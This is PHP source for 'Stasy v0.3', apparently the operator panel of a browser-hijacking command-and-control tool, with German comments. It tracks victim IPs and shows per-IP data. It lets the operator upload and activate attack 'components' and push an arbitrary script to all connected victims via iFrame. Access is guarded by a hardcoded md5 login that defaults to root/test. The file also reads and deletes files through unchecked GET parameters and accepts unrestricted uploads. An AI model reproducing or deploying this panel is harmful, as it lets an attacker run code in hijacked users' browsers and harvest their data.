<html>
	<head>
		<title>Stasy</title>

	</head>
	<body>
	<style type="text/css">
		body { color: #ddd; background-color: #000 }
		.textfeld { color: #555; background-color:#ccc; }
		A:link {text-decoration: none; color: #585858}
		A:visited {text-decoration: none; color: #0B0B61}
		A:active {text-decoration: none}
		A:hover {text-decoration: underline; color: red;}
		.button { padding:0; margin:0; font-size:12px; border: 1px solid #ccc; background-color: #111; color:#FFFFFF;}
		.button_g { padding:0; margin:0; font-size:12px; border: 1px solid #ccc; background-color: #111; color:#00FF00;}
		.verlauf { background-color:#eee; color:#555; color:#000;s } 
		.logo { background-color:#f00; color:#000; font-family:monospace; font-size:130%; font-weight:bold; }
		.header { background-color:#eee; color:#000; font-family:monospace; font-size:130%; font-weight:bold; }
		.divbackground { background-color:#eee; }
	</style>
	<?php
	$auth=1; //Shell Authentication (1=on, 0=off)
        $name='63a9f0ea7bb98050796b649e85481845'; //username (md5) default: root
        $pass='098f6bcd4621d373cade4e832627b4f6'; //password (md5) default: test
	if($auth == 1) 
	{
		if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass) 
		{
			header('WWW-Authenticate: Basic realm="' . $shellname . '"');
			header('HTTP/1.0 401 Unauthorized');
			exit("<html><head><title>" . $shellname . "</title></head><body><p align=\"center\"><font color=\"red\"><b>Access Denied!</b></font><br><br><a href=\"\">reload</a></p></body></html>"); 
		} 
		
	}
	////////////////////////////////////////////////////////////////////////////
	// Funktion zum auslesen des IPChache-Ordners
	///////////////////////////////////////////////////////////////////////////
		if($verlauf=="") $verlauf="<center><b>... Willkommen bei Stasy ....</b></center>";
		function get_file_list($folder) 
		{
			$ret=array();
			if(($o=opendir($folder))!==false) 
			{
				while(($f=readdir($o))!==false) 
				{
					if(!is_dir($folder."/".$f)) 
					{
						$ret[]=array('name' => $f,'date' => filemtime($folder."/".$f));
					}
				}
				closedir($o);
			}
			foreach($ret AS $k=>$v) 
			{
				$dat[$k]=$v['date'];
				$nam[$k]=$v['name'];
			}
			array_multisort($dat,SORT_DESC,$nam,SORT_ASC,$ret);
			return $ret;
		}
		/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Funktion zur Sortierung nach Datum (Aktualität der IPChache-Textdateien
		/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		function diff_time($differenz)
		{  
			$tag  = floor($differenz / (3600*24));
			$std  = floor($differenz / 3600 % 24);
			$min  = floor($differenz / 60 % 60);
			$sek  = floor($differenz % 60);
			return array("sek"=>$sek,"min"=>$min,"std"=>$std,"tag"=>$tag,"woche"=>$woche);
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Auslesen der per GET übergeben IP-Textdatei und Anzeigen der Infos
		//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		if (isset($_GET["ipu"])) 
		{
			if (file_exists("ipcache/" . $_GET["ipu"] . ".txt")) 
			{
				$verlauf="";
				$filename="ipcache/" . $_GET["ipu"] . ".txt";
				$fp = fopen($filename,'r');
				$verlauf .= "<code><b>--[ IP - Info ]--</b></code>";
				$verlauf .="<br><b>" . $_GET['ipu'] . "</b><br>";
				$verlauf .= fread ($fp, filesize ($filename));
				$verlauf = html_entity_decode($verlauf);
				$verlauf=str_replace("#", "<br>", $verlauf);
				
				fclose($fp);
			} 
			else 
			{ 
				$verlauf="Es konnte keine Ip zum untersuchen gefunden werden"; 
			} 
		}
		$filename="com/log.txt";
		if (isset($_GET["l"])) 
		{ 
			if ($_GET["l"]=="0") 
			{ 
				$filename="com/log.txt";
				$fp = fopen($filename,'w');
				fwrite($fp, "###get?c=log###\r\n"); 
			} 
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Auslesen des Comout-Ordners und ausgeben als "aktive Komponenten"
		/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		$comoutpath = "comout/";
		if($comoutdir=opendir($comoutpath))
		{
			while($comoutfile=readdir($comoutdir))
			{
				if (!is_dir($comoutfile) && $comoutfile != "." && $comoutfile != "..")
				{
					$comoutfiles[]=$comoutfile;
				}
			}
		}	
		
		/////////////////////////////////////////////////////
		// Leeren des IPChache-Ordners
		////////////////////////////////////////////////////
		if (isset($_GET["x"])) 
		{                                                   
			$path = "ipcache/";
			if($dir=opendir($path))
			{
				while($file=readdir($dir))
				{
					if (!is_dir($file) && $file != "." && $file != "..")
					{
						if ($file==".htaccess") 
						{ } 
						else 
						{ 
							$files[]=$path.$file;
						}
					}
				}
				closedir($dir); 
			}
			for($qq=0;$qq<count($files);$qq++)
			{
				@unlink($files[$qq]);
			}
		}
		/////////////////////////////////////////////////////
		//~Neue Komponente hochladen
		////////////////////////////////////////////////////
		$uploadFile = $_FILES['userfile']['name'];
		$uploadFile_2= "com/" . $_FILES['userfile']['name'];
		if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadFile_2)) 
		{
			echo "<script>alert(\"Neue Komponente hochgeladen !\")</script>";
			echo "<meta http-equiv=\"refresh\" content=\"1; URL=?\">";
		}
		//~ ///////////////////////////////////////////////
		//~ // Stoppen der Komponenten
		//~ ///////////////////////////////////////////////
		$com="a";
		$com_date=date("j-n-Y H:i");
		if (isset($_GET["s"])) 
		{ 
			if ($_GET["s"]=="0") 
			{ 
				$com="b"; 
				if (file_exists("comout/" . $_GET["com"])) 
				{ 
					unlink("comout/" . $_GET["com"]); 
					$fplog=fopen($filename,'a');
					fwrite($fplog,$com_date."\n".$_GET["com"] . " gestoppt\n");
					fclose($fplog);
					echo "<meta http-equiv=\"refresh\" content=\"1; URL=?\">";
				} 
			}
		}

		///////////////////////////////////////////////////////////
		// Anzeigen Auflistung des IPChaches
		///////////////////////////////////////////////////////////
		$wi=0;
		$path = "ipcache/";
		$IP_files=get_file_list($path);
		$wi=count($IP_files);
		echo "<div class='logo'><center>Stasy v0.3</div>";
		echo "<table style=\"position:static;width:100%;\"><tr><td width=\"100\">";
		echo "<div class='divbackground'><div class='header'>IP's:" . $wi;
		echo "<form action=\"" . $_SERVER['PHP_SELF'] . "\">";
		echo "<select name=\"IPs\" size=\"15\" onchange=\"window.location.href='". $_SERVER['PHP_SELF']."?ipu='+this.form.IPs.options[this.form.IPs.selectedIndex].value\">";
		for($a=0;$a<count($IP_files);$a++)
			{
				$date=getdate();
				$filedate=$IP_files[$a][date];
				$diff=($date[0]-$filedate);
				$differenz=diff_time($diff);
				 $IP_files[$a][name]=ereg_replace(".txt", "", $IP_files[$a][name]);
				echo " <option value=\"" . $IP_files[$a][name] . "\">" . $IP_files[$a][name] . "</option>";
				
			}
		echo "</select></form></div>";
		echo "<a href=\"" . $_SERVER['PHP_SELF'] . "\"><code>IP's reload</code></a>";
		echo "<br><a href=\"" . $_SERVER['PHP_SELF'] . "?x\"><code>IP's leeren</code></a></div>";
		echo "</td><td><div class='verlauf'>".$verlauf."</div>";
		echo "</td>";
		////////////////////////////////////
		// Eigenes Skript an Alle verbunden IPs senden
		////////////////////////////////////
		echo "<td>";
		if (isset($_POST["scriptall"])) 
		{
			$filecontents = stripslashes(html_entity_decode($_POST["scriptall"]));
			$skript_filename="comout/allinusers.php";
			$fp = fopen($skript_filename,'w');
			fwrite($fp, $filecontents);
			fclose($fp);
			$fplog=fopen($filename,'a');
			fwrite($fplog,$com_date."\nF&uuml;r Alle IPs:\n".$filecontents . "\nwird  ausgeführt\n");
			fclose($fplog);
			echo "<script>alert(\"Skript für alle IPs wurde gesendet !\")</script>";
			echo "<meta http-equiv=\"refresh\" content=\"1; URL=?\">";
		}
		//~Script auf alle IP's ausführen
		if (isset($_POST["del"])) 
		{
			unlink("comout/allinusers.php");
			$fplog=fopen($filename,'a');
			fwrite($fplog,$com_date."\nSkript f&uuml;r alle IPs wurde beendet\n");
			fclose($fplog);
			echo "<script>alert(\"Skript für alle IPs wurde entfernt !\")</script>";
			echo "<meta http-equiv=\"refresh\" content=\"1; URL=?\">";
			
		}
		echo "<div class='header'>Skript auf allen Ip's ausf&uuml;hren:</div>(Wird per iFrame eingebunden)<br><br>";
		$all="a";
		if (file_exists("comout/allinusers.php")) 
		{ 
			echo "<b>Status:</b><font color=#0f0> Aktiv</font>"; $all="b"; 
		} 
		else 
		{ 
			echo "<b>Status:</b> Inaktiv"; 
		}
		echo "<form action=\"". $_SERVER['PHP_SELF'] . "\" method=\"post\">";
		if ($all=="b") 
		{ 
			echo "<input type=\"hidden\" name=\"del\" value=\"x\"><input type=\"submit\" value=\"Script anhalten\" class=\"button_g\"></form>"; 
		} 
		else 
		{
			echo "<input type=\"submit\" value=\"senden\" class=\"button\"><br><textarea name=\"scriptall\" cols=\"35\" rows=\"5\" class=\"textfeld\">script...</textarea></form>"; 
		}
		//~End Script ausführen
			
		/////////////////////////////////////
		//Komponenten starten
		////////////////////////////////////
		if ($com=="a") 
		{
			if (isset($_GET["com"])) 
			{ 
				$comlen=strlen($_GET["com"]); 
				if ($comlen>0) 
				{
					$com_filename="com/" . $_GET["com"];
					if (file_exists($com_filename)) 
					{ 
						$fp = fopen($com_filename,'r');
						$comos = fread ($fp, filesize ($com_filename));
						fclose($fp);
						$com_filename="comout/" . $_GET["com"];
						$fp = fopen($com_filename,'w');
						fwrite($fp, $comos); 
						$fplog=fopen($filename,'a');
						fwrite($fplog,$com_date."\n".$_GET["com"] . " gestartet\n");
						fclose($fplog);
						
					} 
					else 
					{ 
						echo "<script>alert(\"component konnte nicht geladen werden\")</script>"; 
					} 
				} 
				else 
				{ 
					echo "<script>alert(\"component konnte nicht geladen werden\")</script>"; 
				} 
				echo "<meta http-equiv=\"refresh\" content=\"1; URL=?\">";
			} 
		}
		////////////////////////////////////////////////////
		//Alles Auflisten aus com-Ordner
		////////////////////////////////////////////////////
		echo "</tr><tr><td colspan=\"2\" valign=\"top\">";
		echo "<table style=\"position:static;width:100%;\"><tr><td>";
		$path = "com/";
		if($dir=opendir($path))
		{
			echo "<table><th colspan=2><div class='header'>Komponenten:</div></th>";
			while($file=readdir($dir))
			{
				if (!is_dir($file) && $file != "." && $file != "..")
				{
					
					$files[]=$file;
					if ($file==".htaccess" or $file=="log.txt" or $file=="lognotice.txt" or $file=="refresh.txt") 
					{ 
					} 
					else 
					{ 
						
						if (!file_exists("comout/" . $file)) 
						{ 
							echo "<tr><td>" . $file . "</td><td><input type=\"button\" name=\"comout\" value=\"starten\" onclick=\"location.href='" . $_SERVER['PHP_SELF'] . "?com=" . $file . "'\" class=\"button\"></td></tr>"; 
						} 
						else 
						{ 
							echo "<tr><td>" .  $file . "</td><td><input type=\"button\" name=\"comout\" value=\"stoppen\" onclick=\"location.href='" . $_SERVER['PHP_SELF'] . "?com=" . $file . "&s=0'\" class=\"button_g\"></td></tr>"; 
						} 
						
					}
					
				}
			}
			echo "</table>";
			closedir($dir); 
		}
		echo "</td><td valign=\"top\"><table><tr><td><div class='header'>gerade aktiv:</div>";
		echo "</td></tr><tr><td>";
		if(count($comoutfiles)>0) 
		{
			for($c=0;$c<count($comoutfiles);$c++)
			{
				echo $comoutfiles[$c]."<br>";
			}
		}
		else echo "Keine Komponenten geladen...";
		echo "</td></tr></table></td></tr></table>";
		/////////////////////////
		//Die Log-Box 
		/////////////////////////
		
		if(file_exists($filename))
		{
			$fpl = fopen($filename,'r');
			$logfile = fread ($fpl, filesize ($filename));
			$log=$logfile;
			fclose($fpl);
		}
		else $log="Keine Logdatei gefunden\n";
		echo "<td valign=\top\" width=\"20%\">";
		echo "<div class='divbackground'><div class='header'>Log</div><textarea cols=\"35\" rows=\"15\" class=\"textfeld\">" .  $log . "</textarea><br><a href=\"" . $_SERVER['PHP_SELF'] . "?l=0\"><code>[Log leeren]</code></a><a href=\"" . $_SERVER['PHP_SELF'] . "\"><code>      [Refresh]</code></a>";
		echo "</div><br><b>Neue Komponente hochladen:</b><br>";
		////////////////////////////////////////////////
		// Upload neuer Komponenten
		///////////////////////////////////////////////
		echo "<form enctype=\"multipart/form-data\" action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\">";
		echo "<input name=\"userfile\" type=\"file\" size=\"25\" class=\"button\"/>";
		echo "<br><input type=\"submit\" value=\"Upload !\" class=\"button\"/></form>";
		echo "</td></tr></table>";
			
	?>
	</body>
</html>
